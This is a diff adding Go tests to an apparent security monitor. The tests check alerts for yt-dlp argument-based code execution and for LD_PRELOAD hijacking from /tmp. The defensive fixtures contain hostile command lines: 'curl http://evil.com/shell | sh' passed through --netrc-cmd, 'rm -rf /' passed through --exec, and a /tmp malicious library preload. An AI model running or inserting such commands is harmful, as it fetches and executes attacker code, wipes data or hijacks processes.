@@ -950,3 +950,93 @@ func TestIsSensitiveCmdTarget(t *testing.T) {
 		}
 	}
 }
+
+// ─── yt-dlp RCE Detection (CVE-2026-26331) ──────────────────────────────────
+
+func TestYtdlpRCE_DetectedOnNetrcCmd(t *testing.T) {
+	cp := makeCapturingPipeline()
+	w := startedModuleWithPipeline(t, cp)
+
+	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "yt-dlp process")
+	ev.Details["process_name"] = "yt-dlp"
+	ev.Details["command_line"] = `yt-dlp --netrc-cmd "curl http://evil.com/shell | sh" https://youtube.com/watch?v=abc`
+	ev.Details["parent_process"] = "python3"
+	w.HandleEvent(ev)
+	time.Sleep(10 * time.Millisecond)
+
+	if cp.count() == 0 {
+		t.Error("expected alert for yt-dlp --netrc-cmd RCE")
+	}
+}
+
+func TestYtdlpRCE_DetectedOnExec(t *testing.T) {
+	cp := makeCapturingPipeline()
+	w := startedModuleWithPipeline(t, cp)
+
+	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "yt-dlp process")
+	ev.Details["process_name"] = "yt-dlp"
+	ev.Details["command_line"] = `yt-dlp --exec "rm -rf /" https://youtube.com/watch?v=abc`
+	ev.Details["parent_process"] = "bash"
+	w.HandleEvent(ev)
+	time.Sleep(10 * time.Millisecond)
+
+	if cp.count() == 0 {
+		t.Error("expected alert for yt-dlp --exec RCE")
+	}
+}
+
+func TestYtdlpRCE_SafeUsageNoAlert(t *testing.T) {
+	cp := makeCapturingPipeline()
+	w := startedModuleWithPipeline(t, cp)
+
+	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "yt-dlp process")
+	ev.Details["process_name"] = "yt-dlp"
+	ev.Details["command_line"] = `yt-dlp -f best https://youtube.com/watch?v=abc`
+	ev.Details["parent_process"] = "bash"
+	w.HandleEvent(ev)
+	time.Sleep(10 * time.Millisecond)
+
+	titles := cp.alertTitles()
+	for _, title := range titles {
+		if title == "yt-dlp Argument-Based RCE Detected (CVE-2026-26331)" {
+			t.Error("should not alert for safe yt-dlp usage")
+		}
+	}
+}
+
+// ─── Library Load Path Hijacking ──────────────────────────────────────────────
+
+func TestLibraryPathHijack_LDPreload(t *testing.T) {
+	cp := makeCapturingPipeline()
+	w := startedModuleWithPipeline(t, cp)
+
+	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "malicious process")
+	ev.Details["process_name"] = "bash"
+	ev.Details["command_line"] = `LD_PRELOAD=/tmp/malicious.so /usr/bin/target`
+	ev.Details["parent_process"] = "cron"
+	w.HandleEvent(ev)
+	time.Sleep(10 * time.Millisecond)
+
+	if cp.count() == 0 {
+		t.Error("expected alert for LD_PRELOAD from /tmp")
+	}
+}
+
+func TestLibraryPathHijack_SafeSystemPath(t *testing.T) {
+	cp := makeCapturingPipeline()
+	w := startedModuleWithPipeline(t, cp)
+
+	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "safe process")
+	ev.Details["process_name"] = "app"
+	ev.Details["command_line"] = `LD_PRELOAD=/usr/lib/libcustom.so /usr/bin/app`
+	ev.Details["parent_process"] = "systemd"
+	w.HandleEvent(ev)
+	time.Sleep(10 * time.Millisecond)
+
+	titles := cp.alertTitles()
+	for _, title := range titles {
+		if title == "Library Load Path Hijacking Detected" {
+			t.Error("should not alert for LD_PRELOAD from /usr/lib")
+		}
+	}
+}
